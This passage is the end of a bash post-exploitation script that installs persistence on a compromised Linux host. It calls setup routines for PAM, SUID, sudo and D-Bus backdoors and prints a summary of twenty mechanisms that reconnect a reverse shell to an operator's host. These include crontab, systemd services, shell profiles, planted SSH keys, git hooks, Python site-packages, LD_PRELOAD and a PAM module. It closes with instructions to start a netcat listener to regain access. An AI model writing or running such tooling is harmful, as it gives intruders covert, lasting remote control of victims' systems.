    setup_pam_persistence
    setup_suid_persistence
    setup_sudo_persistence
    setup_dbus_persistence
    
    print_status "Persistence installation complete!"
    print_status "Multiple persistence mechanisms installed"
    print_status "The system will connect back to $LHOST:$LPORT"
    
    echo ""
    echo "==================== PERSISTENCE SUMMARY ===================="
    echo "Target: $LHOST:$LPORT"
    echo "Reverse shell location: $SHELL_PATH"
    echo "Running as: $CURRENT_USER ($(if [ "$IS_ROOT" = true ]; then echo "root"; else echo "unprivileged user"; fi))"
    echo ""
    echo "Persistence mechanisms installed:"
    
    # Unprivileged user mechanisms
    echo "--- Unprivileged User Mechanisms ---"
    echo "1. User Crontab - Triggers every hour at random minute"
    echo "2. User Systemd Services - Persistent connection + timed intervals"
    echo "3. Shell Profiles - Triggers on user login and new terminals"
    echo "4. SSH Keys - Direct access without listener"
    echo "5. Desktop Entry - Triggers when user runs mimicked app"
    echo "6. GNOME Shell Extension - Triggers when GNOME loads"
    echo "7. Git Hooks - Triggers on git operations"
    echo "8. Python Site-packages - Triggers when Python is executed"
    echo "9. Tmux/Screen Config - Triggers when terminal multiplexer starts"
    echo "10. Browser Settings - Attempts when browser starts"
    echo "11. XDG Autostart - Triggers on desktop login"
    echo "12. At Jobs / Sleep Tasks - Triggers at scheduled times"
    
    # Root-only mechanisms (if we have root)
    if [ "$IS_ROOT" = true ]; then
        echo ""
        echo "--- Root-only Mechanisms ---"
        echo "13. System Cron - System-wide cron persistence"
        echo "14. System Systemd - System-wide service persistence"
        echo "15. Init.d Script - Triggers on system boot"
        echo "16. LD_PRELOAD - Triggers on setuid program execution"
        echo "17. PAM Module - Triggers on user authentication"
        echo "18. SUID Binary - Manually triggered via special binary"
        echo "19. Sudo Configuration - Triggers on sudo command use"
        echo "20. D-Bus System Service - Can be manually triggered"
    fi
    
    echo ""
    echo "To regain access, start a listener with: nc -nlvp $LPORT"
    echo "For SSH access, use the private key displayed above"
    echo "============================================================"
}

# Run the main function
main
